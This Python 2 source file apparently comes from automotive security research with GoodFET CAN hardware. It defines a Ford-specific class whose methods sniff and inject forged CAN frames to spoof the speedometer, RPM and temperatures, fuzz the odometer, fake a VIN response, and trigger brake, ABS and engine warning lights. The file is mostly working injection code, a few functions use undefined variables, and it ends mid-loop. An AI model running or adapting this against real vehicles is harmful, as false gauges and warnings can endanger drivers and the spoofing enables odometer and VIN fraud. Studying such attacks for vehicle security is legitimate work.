import sys;
import binascii;
import array;
import csv, time, argparse;
import datetime
import os
import random
from random import randrange
from GoodFETMCPCAN import GoodFETMCPCAN;
from experiments import experiments
from GoodFETMCPCANCommunication import GoodFETMCPCANCommunication
from intelhex import IntelHex;
import Queue
import math
import wave

tT = time
class FordExperiments(experiments):
    """
    This class is a subclass of experiments and is a car specific module for 
    demonstrating and testing hacks. 
    """
    def __init__(self, dataLocation = "../../contrib/ThayerData/"):
        GoodFETMCPCANCommunication.__init__(self, dataLocation)
        #super(FordExperiments,self).__init__(self) #initialize chip
        self.freq = 500;

    def mimic1056(self,packetData,runTime):
        #setup chip
        self.client.serInit()
        self.spitSetup(self.freq)
        #FIGURE out how to clear buffers
        self.addFilter([1056, 1056, 1056, 1056,1056, 1056], verbose=False)
        packet1 = self.client.rxpacket();
        if(packet1 != None):
            packetParsed = self.client.packet2parsed(packet1);
        #keep sniffing till we read a packet
        while( packet1 == None or packetParsed.get('sID') != 1056 ):
            packet1 = self.client.rxpacket()
            if(packet1 != None):
                packetParsed = self.client.packet2parsed(packet1)
        recieveTime = time.time()
        packetParsed = self.client.packet2parsed(packet1)
        if( packetParsed['sID'] != 1056):
            print "Sniffed wrong packet"
            return
        countInitial = ord(packetParsed['db3']) #initial count value
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            if(packetData.get(idx) == None):
                packet.append(ord(packetParsed.get(idx)))
            else:
                packet.append(packetData.get(idx))
        print packet
        #### split SID into different regs
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        tpast = time.time()
        while( (time.time()-recieveTime) < runTime):
            #care about db3 or packet[8] that we want to count at the rate that it is
            dT = time.time()-tpast
            if( dT/0.2 >= 1):
                db3 = (countInitial + math.floor((time.time()-recieveTime)/0.2))%255
                packet[8] = db3
                self.client.txpacket(packet)
                packetCount += 1
            else:
                packetCount += 1
                self.client.MCPrts(TXB0=True)
            tpast = time.time()  #update our transmit time on the one before   
            
                
         
    def cycledb1_1056(self,runTime):
        #setup chip
        self.client.serInit()
        self.spitSetup(500)
        #FIGURE out how to clear buffers
        self.addFilter([1056, 1056, 1056, 1056,1056, 1056], verbose=False)
        packet1 = self.client.rxpacket();
        if(packet1 != None):
            packetParsed = self.client.packet2parsed(packet1);
        #keep sniffing till we read a packet
        while( packet1 == None or packetParsed.get('sID') != 1056 ):
            time.sleep(.1)
            packet1 = self.client.rxpacket()
            if(packet1 != None):
                packetParsed = self.client.packet2parsed(packet1)
        recieveTime = time.time()
        packetParsed = self.client.packet2parsed(packet1)
        if( packetParsed['sID'] != 1056):
            print "Sniffed wrong packet"
            return
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            packet.append(ord(packetParsed.get(idx)))
        packetValue = 0
        packet[1] = packetValue;
        
        print packet
        #### split SID into different regs
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        tpast = time.time()
        while( (time.time()-recieveTime) < runTime):
            #care about db3 or packet[8] that we want to count at the rate that it is
            dT = time.time()-tpast
            packetValue += 10
            pV = packetValue%255
            #temp = ((packetValue+1))%2
            #if( temp == 1):
            #    pV = packetValue%255
            #else:
            #    pV = 0
            packet[6] = pV
            #packet[6] = 1
            print packet
            self.client.txpacket(packet)
            packetCount += 1
            tpast = time.time()  #update our transmit time on the one before   
        print packetCount;
        
    def getBackground(self,sId):
        """
        This method gets the background packets for the given id. This
        is a simple "background" retriever in that it returns the packet
        that is of the given id that was sniffed off the bus.
        """
        self.client.serInit()
        self.spitSetup(500)
        self.addFilter([sId,sId,sId,sId,sId,sId])
        packet1 = self.client.rxpacket();
        if(packet1 != None):
            packetParsed = self.client.packet2parsed(packet1);
        #keep sniffing till we read a packet
        startTime = time.time()
        while( (packet1 == None or packetParsed.get('sID') != sId) and (time.time() - startTime) < 5):
            packet1 = self.client.rxpacket()
            print packet1
            if(packet1 != None):
                packetParsed = self.client.packet2parsed(packet1)
        if( packet1 == None or packetParsed.get('sID') != sId):
            print "exiting without packet"
        #print "returning", packetParsed
        #recieveTime = time.time()
        return packetParsed

    def cycle4packets1279(self):
        self.client.serInit()
        self.spitSetup(500)
        # filter on 1279
        self.addFilter([1279, 1279, 1279, 1279, 1279, 1279], verbose = False)
        packetParsed = self.getBackground(1279)
        packet = []
        if (packetParsed[db0] == 16):
            # if it's the first of the four packets, replace the value in db7  with 83
            packetParsed[db7] = 83
            # transmit new packet
            self.client.txpacket(packetParsed)
        else:
        # otherwise, leave it alone
            # transmit same pakcet we read in
            self.client.txpacket(packetParsed)
        # print the packet we are transmitting
        print packetParsed
        
    def oscillateMPH(self,runTime):
        self.client.serInit()
        self.spitSetup(500)
        #FIGURE out how to clear buffers
        self.addFilter([513, 513, 513, 513,513, 513], verbose=False)
        packetParsed = self.getBackground(513)
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            packet.append(packetParsed.get(idx))
        packetValue = 0
        packet[1] = packetValue;
        
        print packet
        #### split SID into different regs
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        startTime = tT.time()
        while( (tT.time()-startTime) < runTime):
            dt = tT.time()-startTime
            inputValue = ((2.0*math.pi)/20.0)*dt
            value =         35*math.sin(inputValue)+70
            print value
            #if( value%4 == 0):
            #    packet[5] = 95
            #else:
            #    packet[5] = 0
            #packet[9] = int(value)
            packet[5] = int(value)
            print packet
            self.client.txpacket(packet)
            packetCount += 1
    def oscillateTemperature(self,runTime):
        """
        
        
        """
        #setup chip
        self.client.serInit()
        self.spitSetup(500)
        #FIGURE out how to clear buffers
        self.addFilter([1056, 1056, 1056, 1056,1056, 1056], verbose=False)
        packetParsed = self.getBackground(1056)
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            packet.append(packetParsed.get(idx))
        packetValue = 0
        packet[1] = packetValue;
        
        print packet
        #### split SID into different regs
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        startTime = tT.time()
        while( (tT.time()-startTime) < runTime):
            dt = tT.time()-startTime
            inputValue = ((2.0*math.pi)/20.0)*dt
            value = 30*math.sin(inputValue)+130
            print value
            #packet[5] = int(value)
            if( value > 130 ):
                packet[5] = 160
            else:
                packet[5] = 100
            #packet[6] = 1
            print packet
            self.client.txpacket(packet)
            packetCount += 1
            #tpast = time.time()  #update our transmit time on the one before   
        print packetCount;
        
        
    def fakeVIN(self):
       #reset eveything on the chip
       self.client.serInit() 
       self.reset()
       duration = 20; #seconds 
       
       listenID = 2015
       listenPacket = [2, 9, 6, 153, 153, 153, 153, 153]
       responseID = 2024
       #actual response by the car
       #r1 = [34, 88, 0, 0, 0, 0, 0, 0]
       #r2 = [33, 75, 50, 78, 51, 46, 72, 69 ]
       #r3 = [16, 19, 73, 4, 1, 70, 65, 66]
       
       r1 = [34, 88, 0, 0, 0, 0, 0, 0]
       r2 = [33, 75, 50, 78, 51, 46, 72, 69 ]
       r3 = [16, 19, 73, 160, 159, 70, 65, 66]
       
       #format
       SIDlow = (responseID & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
       SIDhigh = (responseID >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
       packet1 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 r1[0],r1[1],r1[2],r1[3],r1[4],r1[5],r1[6],r1[7]]
       packet2 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
              0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 r2[0],r2[1],r2[2],r2[3],r2[4],r2[5],r2[6],r2[7]]
       packet3 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 r3[0],r3[1],r3[2],r3[3],r3[4],r3[5],r3[6],r3[7]]

       self.multiPacketSpit(packet0 = r1, packet1 = r2, packet2 = r3, packet0rts = True, packet1rts = True, packet2rts = True)

       #filter for the correct packet
       self.filterForPacket(listenID, listenPacket[0],listenPacket[1], verbose = True)
       self.client.rxpacket()
       self.client.rxpacket() # flush buffers if there is anything
       startTime = tT.time()
       while( (tT.time() -startTime) < duration):
           packet = self.client.rxpacket()
           if( packet != None):
               sid =  ord(packet[0])<<3 | ord(packet[1])>>5
               if( sid == listenID):
                   byte3 = ord(packet[6])
                   if( byte3 == listenPacket[3]):
                       print "SendingPackets!"
                       #send packets
                       self.multpackSpit(packet0rts=True,packet1rts=True,packet2rts=True)
                       
    def setScanToolTemp(self,temp):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([2024, 2024, 2024])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (2024 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (2024 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
              
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();

        
        newTemp = math.ceil(level/1.8 + 22)
        #print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)

            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       ord(packet[5]),ord(packet[6]),ord(packet[7]),newTemp,ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            self.multiPacketSpit(packet0rts=True)
       
    def setEngineTemp(self,temp):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([1056, 1056, 1056,1056,1056,1056])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
              
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();

        
        newTemp = int(math.ceil(level/1.8 + 22))
        #print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)

            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       newTemp,ord(packet[6]),ord(packet[7]),ord(packet[8]),ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            self.multiPacketSpit(packet0rts=True)
                    
    def overHeatEngine(self):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([1056, 1056, 1056])
        packet = self.getBackground(1056)
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
    
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       0xfa,packet['db1'],packet['db2'],packet['db3'],packet['db4'],packet['db5'],packet['db6'],packet['db7']]
        startTime = time.time()
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        while( time.time()- startTime < 10):
            self.multiPacketSpit(packet0rts=True)
            
    def runOdometer(self):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([1056, 1056, 1056])
        packet = self.getBackground(1056)
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        odomFuzz = random.randint(1,254)
        print packet
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       packet['db0'],packet['db1'],packet['db2'],packet['db3'],packet['db4'],packet['db5'],packet['db6'],packet['db7']]
        
        startTime = time.time()
        packet[6] = odomFuzz;
        while( time.time()- startTime < 10):
            odomFuzz = random.randint(1,254)
            newPacket[6] = odomFuzz
            self.client.txpacket(newPacket)
        
    def setDashboardTemp(self, temp):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([1056, 1056, 1056])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
              
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();

        
        newTemp = math.ceil(level/1.8 + 22)
        #print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)

            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       newTemp,ord(packet[6]),ord(packet[7]),ord(packet[8]),ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            self.multiPacketSpit(packet0rts=True)

      
    def warningLightsOn(self,checkEngine, checkTransmission, transmissionOverheated, engineLight, battery, fuelCap, checkBreakSystem,ABSLight, dashB):                 
        
        if( checkBreakSystem == 1 or ABSLight == 1):
            SIDlow = (530 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
            SIDhigh = (530 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
            print "looking for 530"
            packet = self.getBackground(530)
            print "found"
            packet2 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       packet['db0'],packet['db1'],packet['db2'],packet['db3'],packet['db4'],packet['db5'],packet['db6'],packet['db7']]
            if( checkBreakSystem == 1 and ABSLight == 1):
                packet2[9] = 97
            elif( checkBreakSystem == 0 and ABSLight == 1):
                packet2[9] = 16
            elif(checkBreakSystem==1 and ABSLight == 0):
                packet2[9] = 64
            packet2rts = True
        else:
            packet2rts = False
            packet2 = None
        print packet2
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        print "looking for 1056"
        packet = self.getBackground(1056)
        print "found"
        packet1 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                   0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                   # lower nibble is DLC                   
                   packet['db0'],packet['db1'],packet['db2'],packet['db3'],packet['db4'],packet['db5'],packet['db6'],packet['db7']] 
        if( checkEngine == 1):
            packet1[9] += 2;
            print packet1
        if( checkTransmission == 1):
            packet1[9] += 3;
            print packet1
        if( transmissionOverheated == 1):
            packet1[9] += 4
            print packet1
        if( engineLight == 1):
            packet1[9] += 64
            print packet1
        if( fuelCap == 1):
            packet1[10] = 255
            print packet1
        if( battery == 1):
            packet1[7] = 33
            print packet1
        if( dashB == 1):
            packet1[6] = 255
        print "hello"
        self.client.serInit()
        self.spitSetup(500)
        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=packet1,packet1=packet2, packet0rts=True,packet1rts=packet2rts )
        starttime = time.time()
        print "starting"
        # spit new value for 1 second
        while ((time.time()-starttime) < 10):
            self.multiPacketSpit(packet0rts=True,packet1rts = packet2rts)
    
    def fakeScanToolFuelLevel(self,level):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([2024, 2024, 2024])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (2024 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (2024 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
              
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();

        level = int(level/.4)
        #print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)

            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       3,65,47,level,ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            self.multiPacketSpit(packet0rts=True)
            
    def fakeOutsideTemp(self,level):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([2024, 2024, 2024,2024,2024,2024])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (2024 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (2024 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
              
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();
        
        newTemp = int(math.ceil(level/1.8 + 22))
        #print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)
        print newTemp
        
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       03,65,70,newTemp,0,0,0,0]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        print newPacket
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            self.multiPacketSpit(packet0rts=True)

    
    def fakeAbsTps(self,level):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([2024, 2024, 2024])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (2024 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (2024 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
              
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();

        abstps = int(math.ceil(level/.39))


            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       ord(packet[5]),ord(packet[6]),ord(packet[7]),abstps,ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            self.multiPacketSpit(packet0rts=True)


                       
    def mphToByteValue(self, mph):
        return ( mph + 63.5 ) / 1.617

    def ByteValuToMph(self, value):
        return 1.617*ord(packet[9]) - 63.5

    def setMPH(self, mph):
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([513, 513, 513])
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        
        SID2 = (1056 & 0x07) << 5;
        SID2high = (1056 >>3) & 0xFF;
        packet_odometer = [SID2high, SID2, 0 ,0,8, 65, 0, 32, 120, 0, 0, 1, 247]
        
        startTime = time.time()  
        #while((time.time() - startTime) < 10):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();
        
        #print self.client.packet2str(packet)

        #print "DB4 = %02d " %ord(packet[9])
       
        #print "Current MPH = 1.617(%d)-63.5 = %d" %(ord(packet[9]), mph)
            
        # calculate our new mph and db4 value
        
        newSpeed = self.mphToByteValue(mph)
        #print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)

            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       ord(packet[5]),ord(packet[6]),ord(packet[7]),ord(packet[8]),int(newSpeed),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 10):
            #self.multiPacketSpit(packet0rts=True)
            odomFuzz = random.randint(1,254)
            packet_odometer[6] = odomFuzz
            self.multiPacketSpit(packet0=newPacket, packet1 =packet_odometer,packet0rts = True, packet1rts=True)

    def speedometerHack(self, inputs):
        
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([513, 513, 513])
        
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
                
       #while(1):
            
        packet = None;

        # catch a packet and check its db4 value
        while (packet == None):
            packet=self.client.rxpacket();
        
        print self.client.packet2str(packet)

        print "DB4 = %02d " %ord(packet[9])
        mph = 1.617*ord(packet[9]) - 63.5
        print "Current MPH = 1.617(%d)-63.5 = %d" %(ord(packet[9]), mph)
            
        # calculate our new mph and db4 value
        mph = mph + inputs[0];
        newSpeed = ( mph + 63.5 ) / 1.617
        print "Fake MPH = 1.617(%d)-63.5 = %d" %(newSpeed, mph)

            
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                       0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                       # lower nibble is DLC                   
                       ord(packet[5]),ord(packet[6]),ord(packet[7]),ord(packet[8]),int(newSpeed),ord(packet[10]),ord(packet[11]),ord(packet[12])]

        # load new packet into TXB0 and check time
        self.multiPacketSpit(packet0=newPacket, packet0rts=True)
        starttime = time.time()
        
        # spit new value for 1 second
        while (time.time()-starttime < 1):
            
            self.multiPacketSpit(packet0rts=True)
                
    def rpmToByteValue(self, rpm):
        value = ( rpm + 61.88 ) / 64.5
        return int(value)
    
    def ValueTorpm(self, value):
        rpm = 64.5*value - 61.88
        return rpm
    
    def setRPM(self, rpm):
        self.client.serInit()
        self.spitSetup(500)
    
        self.addFilter([513, 513, 513,513])
    
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        
        #clear buffers
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()

        startTime = tT.time()
        while((tT.time() - startTime )< 10):
        
            packet = None;
        
            # catch a packet and check its db4 value
            while (packet == None):
                packet=self.client.rxpacket();
        
            #print self.client.packet2str(packet)
        
            #print "DB4 = %02d " %ord(packet[5])
           
            #print "Current RPM = 64.5(%d)-61.88 = %d" %(ord(packet[5]), rpm)
        
            newRPM = self.rpmToByteValue(rpm)
            #print "Fake RPM = 64.5(%d)-61.88 = %d" %(newRPM, rpm)
            
        
            newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                     0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                     # lower nibble is DLC                   
                     int(newRPM),ord(packet[6]),ord(packet[7]),ord(packet[8]),ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]
        
            # load new packet into TXB0 and check time
            self.multiPacketSpit(packet0=newPacket, packet0rts=True)
            starttime = time.time()
        
            # spit new value for 1 second
            while (time.time()-starttime < 1):
                self.multiPacketSpit(packet0rts=True)

    def rpmHack(self, inputs):
        """
        This method will increase the rpm by the given rpm amount.
        
        @type inputs: List
        @param inputs: Single element of a list that corresponds to the amount the user
                       wishses to 
        """
    
        self.client.serInit()
        self.spitSetup(500)
    
        self.addFilter([513, 513, 513])
    
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        startTime = tT.time()
        while((tT.time() - startTime )< 10):
        
            packet = None;
        
            # catch a packet and check its db4 value
            while (packet == None):
                packet=self.client.rxpacket();
        
            print self.client.packet2str(packet)
        
            print "DB4 = %02d " %ord(packet[5])
            rpm = 64.5*ord(packet[5]) - 61.88
            print "Current RPM = 64.5(%d)-61.88 = %d" %(ord(packet[5]), rpm)
        
            # calculate our new mph and db4 value
            rpm = rpm + inputs[0];
            newRPM = ( rpm + 61.88 ) / 64.5
            newRPM = int(newRPM)
            print "Fake RPM = 64.5(%d)-61.88 = %d" %(newRPM, rpm)
            
        
            newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                     0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                     # lower nibble is DLC                   
                     int(newRPM),ord(packet[6]),ord(packet[7]),ord(packet[8]),ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]
        
            # load new packet into TXB0 and check time
            self.multiPacketSpit(packet0=newPacket, packet0rts=True)
            starttime = time.time()
        
            # spit new value for 1 second
            while (time.time()-starttime < 1):
                self.multiPacketSpit(packet0rts=True)

    def imbeethovenbitch(self):
        
        
        ### USUAL SETUP STUFF  ######
        self.client.serInit()
        self.spitSetup(500)
        self.addFilter([513, 513, 513,513])
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        
        #clear buffers
        self.client.rxpacket()
        self.client.rxpacket()
        self.client.rxpacket()
        
        
        packet = None;
        
        #catch a packet to mutate
        while (packet == None):
            packet=self.client.rxpacket();
        newPacket = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                     0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                     # lower nibble is DLC                   
                     ord(packet[5]),ord(packet[6]),ord(packet[7]),ord(packet[8]),ord(packet[9]),ord(packet[10]),ord(packet[11]),ord(packet[12])]
        
        
        # NOW THE FUN STUFF!!!!!
        
        music = wave.open("../../contrib/ted/beethovensfifth.wav", 'r');
        print "number of frames: %d " %music.getnframes()
        print "number of channels: %d " %music.getnchannels()
        print "sample width: %d " %music.getsampwidth()
        print "framerate: %d " %music.getframerate()
        print "compression: %s " %music.getcompname()
        
        
        numFramesToRead = music.getframerate()*.05 # grab .1s of audio
        sampNum = 0
        avgprev = 0
        avg = 0
        while(1):
            avgprev = avg
            runningSum = 0
            
            sample = music.readframes(int(numFramesToRead)) # grab .1s of audio
            
            length = len(sample)
            
            for i in range(0, length,4):
                runningSum += ord(sample[i]) 	#average the dual-channel
                runningSum += ord(sample[i+2])
            
            avg = math.fabs(runningSum/(length /2) -127)       # we used 2 of every 4 frames, so divide length by 2
            if( sampNum > 0):
                 avg = (avg+avgprev)/2
            sampNum = 1

            val = int(avg*15 + 40)			# normalize to speedometer range of values
            
            print "speedometerVal = %f " %val;
            print "speed = %f" %(1.617*val-63.5)	# speed we're trying to display
            
            if (val > 255):						# ensure we don't run off acceptable range
                val = 255
            elif (val < 0):
                val = 0
            
            newPacket[9] = int(val)				# write it to the packet
            
            # load new packet into TXB0 and check time
            self.multiPacketSpit(packet0=newPacket, packet0rts=True)
            starttime = time.time()
            
            # spit new value for 1 second
            while (time.time()-starttime < .1):
